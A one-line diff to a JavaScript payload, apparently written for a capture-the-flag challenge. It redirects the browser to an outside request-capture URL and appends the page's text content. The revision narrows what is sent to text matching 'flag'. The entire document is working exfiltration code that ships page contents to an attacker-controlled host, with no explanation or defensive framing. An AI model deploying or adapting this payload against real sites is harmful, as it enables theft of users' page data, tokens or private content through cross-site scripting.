@@ -1,1 +1,1 @@
-document.location="https://eoal755bgci9s2b.m.pipedream.net/?a=" + document.body.textContent;
+document.location="https://eoal755bgci9s2b.m.pipedream.net/?a=" + document.body.textContent.match(/flag.+/);
